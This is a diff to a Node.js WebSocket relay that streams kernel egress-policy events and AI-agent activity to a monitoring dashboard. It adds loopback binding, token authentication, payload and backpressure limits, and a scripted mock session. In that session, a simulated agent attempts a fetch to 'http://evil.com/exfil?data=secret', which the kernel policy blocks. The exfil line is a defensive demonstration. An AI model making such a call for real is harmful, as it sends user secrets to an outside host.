@@ -21,10 +21,25 @@ const path = require('path');
 const { WebSocketServer, WebSocket } = require('ws');
 
 const PORT = Number(process.env.PORT) || 8765;
+// Default loopback-only: the relay forwards privileged kernel events with no
+// origin check or per-event signature, so the only thing keeping a network
+// peer from spoofing or harvesting them is who can reach the socket.
+// Override via HOST=0.0.0.0 only if you understand and accept that exposure.
+const HOST = process.env.HOST || '127.0.0.1';
 const HANDSHAKE_TIMEOUT_MS = 3000;
 const MOCK_INTERVAL_MS = 2000;
 const MOCK_ENABLED = process.env.MOCK_EVENTS === '1';
 const SERVE_STATIC = process.env.SERVE_STATIC === '1';
+// Optional shared secret. When set, the sender handshake must include
+// { token: VIEWER_TOKEN } or it will be rejected. Viewers are unauthenticated
+// (loopback bind is the access control there).
+const VIEWER_TOKEN = process.env.VIEWER_TOKEN || '';
+// Cap individual WebSocket frames so a hostile sender cannot drive memory
+// growth via a single huge message.
+const WS_MAX_PAYLOAD = Number(process.env.WS_MAX_PAYLOAD) || 1 * 1024 * 1024;
+// Drop a viewer whose internal send buffer exceeds this — slow viewers must
+// not back up the relay across all other consumers.
+const WS_MAX_BUFFER  = Number(process.env.WS_MAX_BUFFER) || 8 * 1024 * 1024;
 
 // dist/ lives next to viewer-app/, which lives next to server/.
 const DIST_ROOT = path.resolve(__dirname, '..', 'viewer-app', 'dist');
@@ -33,6 +48,13 @@ const senders = new Set();
 const viewers = new Set();
 
 let nextClientId = 1;
+
+const recentEventsBuffer = [];
+const BUFFER_MAX = 20;
+
+function getRecentEvents() {
+  return recentEventsBuffer.slice();
+}
 
 function ts() {
   return new Date().toISOString();
@@ -53,20 +75,51 @@ function describe(client) {
 }
 
 function broadcastToViewers(rawJson, fromClient) {
+  try {
+    const parsed = JSON.parse(rawJson);
+    if (parsed && typeof parsed === 'object') {
+      recentEventsBuffer.push(parsed);
+      if (recentEventsBuffer.length > BUFFER_MAX) recentEventsBuffer.shift();
+    }
+  } catch {
+    // malformed JSON — skip buffering, still relay
+  }
+
   if (viewers.size === 0) return;
   let delivered = 0;
-  for (const viewer of viewers) {
-    if (viewer.ws.readyState === WebSocket.OPEN) {
-      viewer.ws.send(rawJson);
-      delivered += 1;
+  let dropped = 0;
+  // Iterate over a snapshot so we can mutate viewers as we go.
+  for (const viewer of [...viewers]) {
+    if (viewer.ws.readyState !== WebSocket.OPEN) continue;
+    if (viewer.ws.bufferedAmount > WS_MAX_BUFFER) {
+      // Slow viewer: closing 1011 is "internal error", which is the closest
+      // standard code for "we're dropping you to protect everyone else".
+      warn(`dropping slow viewer ${describe(viewer)} (bufferedAmount=${viewer.ws.bufferedAmount})`);
+      try { viewer.ws.close(1011, 'backpressure'); } catch (_) {}
+      viewers.delete(viewer);
+      dropped += 1;
+      continue;
+    }
+    viewer.ws.send(rawJson);
+    delivered += 1;
+  }
+  if (fromClient) {
+    if (dropped > 0) {
+      log(`relayed event from ${describe(fromClient)} → ${delivered} viewer(s), dropped ${dropped} slow`);
+    } else {
+      log(`relayed event from ${describe(fromClient)} → ${delivered} viewer(s)`);
     }
   }
-  log(`relayed event from ${describe(fromClient)} → ${delivered} viewer(s)`);
 }
 
 function handleHandshake(client, msg) {
   const role = msg && msg.role;
   if (role === 'sender') {
+    if (VIEWER_TOKEN && msg.token !== VIEWER_TOKEN) {
+      warn(`handshake: ${describe(client)} rejected (sender token mismatch)`);
+      try { client.ws.close(4401, 'unauthorized'); } catch (_) {}
+      return false;
+    }
     client.role = 'sender';
     client.name = typeof msg.name === 'string' ? msg.name : 'unnamed-sender';
     senders.add(client);
@@ -80,6 +133,7 @@ function handleHandshake(client, msg) {
     client.role = 'viewer';
     viewers.add(client);
   }
+  return true;
 }
 
 function defaultToViewer(client) {
@@ -207,16 +261,20 @@ function handleHttpRequest(req, res) {
 // and intercepts only Upgrade requests, leaving plain GETs to handleHttpRequest.
 // ---------------------------------------------------------------------------
 const httpServer = http.createServer(handleHttpRequest);
-const wss = new WebSocketServer({ server: httpServer });
+const wss = new WebSocketServer({ server: httpServer, maxPayload: WS_MAX_PAYLOAD });
 
 httpServer.on('listening', () => {
-  log(`WebSocket relay listening on ws://localhost:${PORT}`);
+  log(`WebSocket relay listening on ws://${HOST}:${PORT}`);
+  if (HOST !== '127.0.0.1' && HOST !== 'localhost' && HOST !== '::1') {
+    warn(`HOST=${HOST} binds non-loopback — kernel events are exposed to anything that can reach this port. Set VIEWER_TOKEN to require sender authentication.`);
+  }
   if (SERVE_STATIC) {
-    log(`serving dashboard at http://localhost:${PORT}  (dist: ${DIST_ROOT})`);
+    log(`serving dashboard at http://${HOST}:${PORT}  (dist: ${DIST_ROOT})`);
   } else {
     log('static dashboard: disabled (set SERVE_STATIC=1 to enable)');
   }
   log(`mock events: ${MOCK_ENABLED ? 'ENABLED (every ' + MOCK_INTERVAL_MS + 'ms)' : 'disabled'}`);
+  log(`sender auth: ${VIEWER_TOKEN ? 'required (VIEWER_TOKEN set)' : 'disabled (set VIEWER_TOKEN to require)'}`);
 });
 
 httpServer.on('error', (err) => {
@@ -256,6 +314,8 @@ wss.on('connection', (ws, req) => {
         return;
       }
       handleHandshake(client, parsed);
+      // handleHandshake closes the socket on auth failure; the close event
+      // will run removeClient. Nothing else to do here.
       return;
     }
 
@@ -296,61 +356,55 @@ wss.on('connection', (ws, req) => {
   });
 });
 
-httpServer.listen(PORT);
+httpServer.listen(PORT, HOST);
 
 // Optional mock event emitter so the pipeline can be tested without P2/P4.
-// Acts like an internal sender — fabricates events and broadcasts them to viewers.
+// Plays a scripted demo session in order, then pauses and repeats.
 function startMockEmitter() {
-  const llmSamples = [
-    { type: 'stdout', data: { line: 'agent: thinking about the task...' } },
-    { type: 'tool_call', data: { tool: 'fetch_url', args: { url: 'https://example.com' } } },
-    { type: 'tool_call', data: { tool: 'fetch_url', args: { url: 'https://evil.com/exfil' } } },
-    { type: 'stopped', data: { exit_code: 0 } },
-  ];
-  const kernelSamples = [
-    {
-      type: 'connect_attempt',
-      data: { dst_ip: '93.184.216.34', dst_port: 443, hostname: 'example.com' },
-    },
-    {
-      type: 'connect_allowed',
-      data: {
-        dst_ip: '93.184.216.34',
-        dst_port: 443,
-        hostname: 'example.com',
-        reason: 'in allowed_hosts',
-      },
-    },
-    {
-      type: 'connect_blocked',
-      data: {
-        dst_ip: '203.0.113.42',
-        dst_port: 80,
-        hostname: 'evil.com',
-        reason: 'no policy match',
-      },
-    },
-  ];
-
   const fakeClient = { id: 0, role: 'sender', name: 'mock-emitter', ws: null };
-  let i = 0;
 
-  setInterval(() => {
-    const useLlm = i % 2 === 0;
-    const pool = useLlm ? llmSamples : kernelSamples;
-    const sample = pool[Math.floor(Math.random() * pool.length)];
-    const event = {
-      agent: 'demo-agent',
-      type: sample.type,
-      ts: Date.now() / 1000,
-      data: sample.data,
-    };
-    broadcastToViewers(JSON.stringify(event), fakeClient);
-    i += 1;
-  }, MOCK_INTERVAL_MS);
+  // Each entry: [delay_ms_from_session_start, event_object]
+  // Kernel events are interleaved between tool_call and tool_result at realistic timestamps.
+  const SCRIPT = [
+    [   0, { agent: 'demo-agent', type: 'session_start', data: { launch_mode: 'local', command: ['python', 'demo_agent.py'], allowed_hosts: ['llm-proxy.dev.outshift.ai', 'example.com'], mode: 'enforce', pid: 12345 } }],
+    [ 900, { agent: 'demo-agent', type: 'user_input',    data: { text: 'Fetch https://example.com and summarize the content for me', raw: '[USER] Fetch https://example.com and summarize it' } }],
+    [1800, { agent: 'demo-agent', type: 'stdout',        data: { line: 'Thinking about the task...' } }],
+    [2400, { agent: 'demo-agent', type: 'tool_call',     data: { tool: 'fetch_url', args: { url: 'https://example.com' } } }],
+    [2600, { agent: 'demo-agent', type: 'connect_attempt', data: { dst_ip: '93.184.216.34', dst_port: 443, hostname: 'example.com' } }],
+    [2800, { agent: 'demo-agent', type: 'connect_allowed', data: { dst_ip: '93.184.216.34', dst_port: 443, hostname: 'example.com', reason: 'in allowed_hosts' } }],
+    [3600, { agent: 'demo-agent', type: 'tool_result',   data: { tool: 'fetch_url', ok: true,  url: 'https://example.com',       status_code: 200,  chars: 412, preview: 'Example Domain...', raw: '[RESULT] ok' } }],
+    [4500, { agent: 'demo-agent', type: 'tool_call',     data: { tool: 'fetch_url', args: { url: 'http://evil.com/exfil?data=secret' } } }],
+    [4700, { agent: 'demo-agent', type: 'connect_attempt', data: { dst_ip: '203.0.113.42', dst_port: 80, hostname: 'evil.com' } }],
+    [4900, { agent: 'demo-agent', type: 'connect_blocked', data: { dst_ip: '203.0.113.42', dst_port: 80, hostname: 'evil.com', reason: 'no policy match' } }],
+    [5100, { agent: 'demo-agent', type: 'tool_result',   data: { tool: 'fetch_url', ok: false, url: 'http://evil.com/exfil?data=secret', status_code: null, chars: 0,   preview: '',                raw: '[RESULT] blocked' } }],
+    [6200, { agent: 'demo-agent', type: 'agent_output',  data: { text: 'Here is a summary of example.com: it is a sample domain used for illustrative purposes in documentation.', raw: '[AGENT] Here is a summary...' } }],
+    [7000, { agent: 'demo-agent', type: 'stopped',       data: { exit_code: 0 } }],
+  ];
+
+  const REPEAT_PAUSE_MS = 6000; // pause between sessions
+
+  function runSession() {
+    const sessionId = `demo-agent-${Math.random().toString(36).slice(2, 8)}`;
+    log(`mock: starting demo session ${sessionId}`);
+
+    for (const [delay, template] of SCRIPT) {
+      setTimeout(() => {
+        const event = { ...template, ts: Date.now() / 1000, session_id: sessionId };
+        broadcastToViewers(JSON.stringify(event), fakeClient);
+      }, delay);
+    }
+
+    const lastDelay = SCRIPT[SCRIPT.length - 1][0];
+    setTimeout(runSession, lastDelay + REPEAT_PAUSE_MS);
+  }
+
+  runSession();
 }
 
 if (MOCK_ENABLED) startMockEmitter();
+
+const { startAnalyser } = require('./analyser');
+startAnalyser(getRecentEvents, (rawJson) => broadcastToViewers(rawJson, null));
 
 function shutdown(signal) {
   log(`received ${signal}, closing server...`);
